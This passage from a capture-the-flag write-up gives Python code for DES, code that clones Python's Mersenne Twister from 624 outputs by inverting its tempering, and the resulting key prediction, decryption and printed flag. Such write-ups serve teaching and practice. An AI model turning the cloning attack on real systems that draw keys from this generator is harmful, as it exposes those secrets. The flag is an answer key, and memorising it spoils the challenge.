        26, 8, 16, 7, 27, 20, 13, 2,
        41, 52, 31, 37, 47, 55, 30, 40,
        51, 45, 33, 48, 44, 49, 39, 56,
        34, 53, 46, 42, 50, 36, 29, 32, ]
P = [16, 7, 20, 21,
     29, 12, 28, 17,
     1, 15, 23, 26,
     5, 18, 31, 10,
     2, 8, 24, 14,
     32, 27, 3, 9,
     19, 13, 30, 6,
     22, 11, 4, 25, ]
movnum = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1]

def HexToBin(string):
    "Convert sixteen to binary"
    Binstring = ""
    string = string.lower()
    for i in string:
        try:
            Binstring += hexadecimalcontrast[i]
        except:
            return -1
    return Binstring

def BinToStr(strbin):
    "Turn the binary string to a ASCII string"
    strten = ""
    for i in range(len(strbin) // 8):
        num = 0
        test = strbin[i * 8:i * 8 + 8]
        for j in range(8):
            num += int(test[j]) * (2**(7 - j))
        strten += chr(num)
        # print num
    return strten

def StrToHex(string):
    "Converts a string to HEX"
    hexStr = ''
    for i in string:
        tmp = str(hex(ord(i)))
        if len(tmp) == 3:
            hexStr += tmp.replace('0x', '0')
        else:
            hexStr += tmp.replace('0x', '')
    return hexStr
def Binxor(string1, string2):
    "If the length is different, only the short one is returned."
    strlen = 0
    xorstr = ""
    if len(string1) > len(string2):
        strlen = len(string2)
    else:
        strlen = len(string1)
    for i in range(strlen):
        if string1[i] == string2[i]:
            xorstr += '0'
        else:
            xorstr += '1'
    return xorstr

def SubstitutionBox(keyfield, sub):
    newkeyfield = ''
    for i in range(len(sub)):
        newkeyfield += keyfield[sub[i] - 1]
    return newkeyfield
def SubkeyGeneration(freq, C, D):
    for i in range(movnum[freq]):
        C = C[1:] + C[:1]
        D = D[1:] + D[:1]
    return C, D, SubstitutionBox(C + D, PC_2)
def enkey(secretkey):
    netss = SubstitutionBox(HexToBin(StrToHex(secretkey)), PC_1)
    C, D = netss[:28], netss[28:]
    key = []
    for i in range(16):
        C, D, keyone = SubkeyGeneration(i, C, D)
        key.append(keyone)
    return key

def Sbox(plaintext, sub):
    return HexToBin("%x" % S[sub][int(plaintext[:1] + plaintext[-1:], 2) * 16 + int(plaintext[1:-1], 2)])

def Function(plaintext, secretkey):
    plaintext = Binxor(SubstitutionBox(plaintext, E),
                       secretkey)
    sout = ''
    for i in range(8):
        sout += Sbox(plaintext[i * 6:(i + 1) * 6], i)
    sout = SubstitutionBox(sout, P)
    return sout

def endecrypt(plaintext, secretkey):
    netss = SubstitutionBox(HexToBin(StrToHex(plaintext)), IP)
    L, R = netss[:32], netss[32:]
    for i in range(16):
        L, R = R, Binxor(L, Function(R, secretkey[i]))
    return SubstitutionBox(R + L, IP_1)

def encryption(plaintext, secretkey):
    plaintext = plaintext + (8 - len(plaintext) % 8) * '\0'
    keys = enkey(secretkey[:8])
    ciphertext = ''
    for i in range(len(plaintext) / 8):
        ciphertext += endecrypt(plaintext[i * 8:(i + 1) * 8], keys)
    return base64.b64encode(BinToStr(ciphertext))
def decryption(plaintext, secretkey):
    plaintext = base64.b64decode(plaintext)
    keys = enkey(secretkey[:8])
    ciphertext = ''
    for i in range(len(plaintext) / 8):
        ciphertext += endecrypt(plaintext[i * 8:(i + 1) * 8], keys[::-1])
    return BinToStr(ciphertext)
def generate():
    fw = open("random", "w")
    for i in range(700):
        fw.write(str(random.getrandbits(32))+"\n")
    fw.close()


f = open("random",'r').readlines()
prng = []
for i in f:
    i = i.strip('\n')
    prng.append(int(i))


def invert_right(m,l,val=''):
    length = 32
    mx = 0xffffffff
    if val == '':
        val = mx
    i,res = 0,0
    while i*l<length:
        mask = (mx<<(length-l)&mx)>>i*l
        tmp = m & mask
        m = m^tmp>>l&val
        res += tmp
        i += 1
    return res
def invert_left(m,l,val):
    length = 32
    mx = 0xffffffff
    i,res = 0,0
    while i*l < length:
        mask = (mx>>(length-l)&mx)<<i*l
        tmp = m & mask
        m ^= tmp<<l&val
        res |= tmp
        i += 1
    return res
def invert_temper(m):
    m = invert_right(m,18)
    m = invert_left(m,15,4022730752)
    m = invert_left(m,7,2636928640)
    m = invert_right(m,11)
    return m
# 注意事项: temper 可以破解是因为可以对位移进行求逆，但是并不是所有的位移都可以求逆，
# 对一个数 进行 m = m^m>>c&d 是不会改变 m的位数的 即右移运算不改变位数
# 但是如果进行左移运算是可能改变位数的，如果位数一旦改变，就无法确定，求逆过程中循环的次数
# 特殊的是，我们知道 MT算法中的 state 元素都是 32位的，所以可以求逆
from random import Random
def clone_mt(record):
    state = [invert_temper(i) for i in record]
    gen = Random()
    gen.setstate((3,tuple(state+[0]),None))
    return gen

g = clone_mt(prng[:624])
for i in range(700):
    g.getrandbits(32)
key = g.getrandbits(32)
print(key)
key = str(key)
cipher = 't2GzuEfVDaJsNLBqC8N7C3/2UgIeCoQLC2qLkT1ukFULskzMc1u9QeFizVUfFYfA'
print decryption(cipher,key)
#2990136190
#flag{0ab91ca0-0aee-4582-849a-90207ec48528}  
```



---
## W | 题目名称 | 解题做题人







